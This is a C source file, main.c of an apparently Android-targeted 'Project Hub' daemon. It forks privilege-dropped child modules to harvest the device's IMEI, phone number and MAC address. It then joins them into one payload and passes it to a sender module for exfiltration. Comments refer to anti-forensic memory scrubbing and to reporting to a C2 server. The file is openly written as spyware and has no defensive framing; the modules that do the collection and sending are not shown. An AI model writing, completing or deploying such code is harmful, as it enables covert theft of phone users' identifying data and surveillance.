/**
 * @file main.c
 * @brief Project Hub Daemon - Sequential Orchestrator.
 *
 * Implements the core lifecycle:
 * 1. Initialize System Abstraction Layer.
 * 2. Sequentially spawn isolated modules to extract data.
 * 3. Aggregate data and exfiltrate.
 * 4. Ensure process hygiene (zombie reaping, FD closing, memory scrubbing).
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/prctl.h>
#include <signal.h>
#include <errno.h>
#include <dirent.h>
#include <ctype.h>

#include "ipc.h"
#include "symbol_resolver.h"
#include "modules.h"

// --- Configuration ---
#define DROP_UID 9999              /**< Target UID for isolation */
#define DROP_GID 9999              /**< Target GID for isolation */
#define DROP_CONTEXT "u:r:isolated_app:s0" /**< SELinux Context */

// --- Global State ---
typedef struct {
    char imei[256];
    char phone_number[256];
    char mac_address[256];
    
    int has_imei;
    int has_phone;
    int has_mac;
} GlobalContext;

// --- Helper Functions ---

/**
 * @brief Closes all file descriptors except the socket.
 * Prevents FD leakage from parent to untrusted child.
 * Safely handles /proc/self/fd/ enumeration.
 */
static void close_all_fds_except(int keep_fd) {
    DIR* dir = opendir("/proc/self/fd");
    if (!dir) return;

    int dir_fd = dirfd(dir);
    struct dirent* entry;
    
    while ((entry = readdir(dir)) != NULL) {
        if (!isdigit(entry->d_name[0])) continue;
        
        int fd = atoi(entry->d_name);
        
        // Preserve standard streams, the keeper FD, and the directory stream
        if (fd > 2 && fd != keep_fd && fd != dir_fd) {
            close(fd);
        }
    }
    closedir(dir);
}

/**
 * @brief Spawns a new isolated process for a module.
 * Handles fork, socketpair, privilege dropping, and memory scrubbing.
 */
static pid_t spawn_module_process(
    int module_id, 
    const char* arg, 
    int* parent_socket_fd,
    void* global_ctx_ptr,
    size_t ctx_size
) {
    int sv[2];
    // Use DGRAM for atomic packet boundaries
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0) {
        sal_log_error("Socketpair failed");
        return -1;
    }

    pid_t pid = fork();

    if (pid < 0) {
        sal_log_error("Fork failed");
        close(sv[0]); close(sv[1]);
        return -1;
    }

    if (pid == 0) {
        // --- Child Process ---
        close(sv[0]);
        int socket_fd = sv[1];

        // 1. Anti-Forensic: Scrub inherited heap data
        if (global_ctx_ptr && ctx_size > 0) {
            memset(global_ctx_ptr, 0, ctx_size);
        }

        // 2. FD Hygiene
        close_all_fds_except(socket_fd);

        // 3. Safety: Terminate if parent dies
        prctl(PR_SET_PDEATHSIG, SIGKILL);

        // 4. Drop Privileges
        sal_set_selinux_context(DROP_CONTEXT);
        
        // Strict Error Checking: Die if we cannot drop privileges
        if (setresgid(DROP_GID, DROP_GID, DROP_GID) < 0) _exit(EXIT_FAILURE);
        if (setresuid(DROP_UID, DROP_UID, DROP_UID) < 0) _exit(EXIT_FAILURE);

        // 5. Execute Module
        module_entry_fn entry = get_module_entry(module_id);
        if (entry) {
            entry(socket_fd, arg);
        }

        close(socket_fd);
        _exit(EXIT_SUCCESS); 
    }

    // --- Parent Process ---
    close(sv[1]);
    *parent_socket_fd = sv[0];
    return pid;
}

/**
 * @brief Waits for data from a module with a timeout.
 */
static int collect_result(int socket_fd, char* buffer, size_t size) {
    IpcResponse resp;
    ipc_init_response(&resp);

    struct timeval tv = {2, 0}; // 2 Second Timeout
    setsockopt(socket_fd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);

    int ret = ipc_receive_packet(socket_fd, &resp);
    
    if (ret == 0 && resp.status_code == 0 && resp.data_len > 0) {
        strncpy(buffer, resp.payload, size - 1);
        buffer[size - 1] = '\0';
        return 1; // Success
    }
    return 0; // Failure/Timeout
}

/**
 * @brief Spawns the Logger module to report status to C2.
 */
static void run_logger(const char* msg, void* ctx, size_t ctx_sz) {
    int dummy_fd;
    pid_t pid = spawn_module_process(MOD_ID_LOGGER, msg, &dummy_fd, ctx, ctx_sz);
    if (pid > 0) {
        close(dummy_fd);
        waitpid(pid, NULL, 0);
    }
}

/**
 * @brief Executes a single extraction stage (Spawn -> Collect -> Reap -> Log).
 */
static int execute_stage(
    int mod_id, 
    const char* stage_name, 
    char* out_buf, 
    size_t out_len, 
    GlobalContext* ctx
) {
    sal_log_info("Extracting %s...", stage_name);
    
    int fd;
    pid_t pid = spawn_module_process(mod_id, NULL, &fd, ctx, sizeof(GlobalContext));
    int success = 0;
    char log_buf[256];

    if (pid > 0) {
        if (collect_result(fd, out_buf, out_len)) {
            success = 1;
            snprintf(log_buf, sizeof(log_buf), "%s: Success", stage_name);
        } else {
            sal_log_error("%s: Failed/Timeout", stage_name);
            kill(pid, SIGKILL); // Force kill if hung
            snprintf(log_buf, sizeof(log_buf), "%s: Failed", stage_name);
        }
        close(fd);
        waitpid(pid, NULL, 0); // Always reap to prevent zombies
        
        // Report status to C2
        run_logger(log_buf, ctx, sizeof(GlobalContext));
    } else {
        sal_log_error("Failed to spawn %s", stage_name);
    }

    return success;
}

// --- Main Orchestrator ---

int main() {
    sal_init();
    sal_log_info("Project Hub v2.1 Started. PID: %d", getpid());

    GlobalContext* ctx = (GlobalContext*)calloc(1, sizeof(GlobalContext));
    if (!ctx) return EXIT_FAILURE;

    // --- Phase 2: Sequential Extraction ---
    
    if (execute_stage(MOD_ID_IMEI, "IMEI", ctx->imei, sizeof(ctx->imei), ctx)) {
        ctx->has_imei = 1;
    }

    if (execute_stage(MOD_ID_PHONE, "Phone", ctx->phone_number, sizeof(ctx->phone_number), ctx)) {
        ctx->has_phone = 1;
    }

    if (execute_stage(MOD_ID_MAC, "MAC", ctx->mac_address, sizeof(ctx->mac_address), ctx)) {
        ctx->has_mac = 1;
    }

    // --- Phase 3: Aggregation & Exfiltration ---
    sal_log_info("Aggregating Payload...");
    
    char final_payload[4096];
    snprintf(final_payload, sizeof(final_payload), 
        "IMEI:%s|PHONE:%s|MAC:%s",
        ctx->has_imei ? ctx->imei : "N/A",
        ctx->has_phone ? ctx->phone_number : "N/A",
        ctx->has_mac ? ctx->mac_address : "N/A"
    );

    int fd;
    pid_t pid = spawn_module_process(MOD_ID_SENDER, final_payload, &fd, ctx, sizeof(GlobalContext));
    if (pid > 0) {
        close(fd); 
        waitpid(pid, NULL, 0);
    }

    // --- Shutdown ---
    free(ctx);
    sal_cleanup();
    sal_log_info("Daemon Exiting Gracefully.");
    return EXIT_SUCCESS;
}


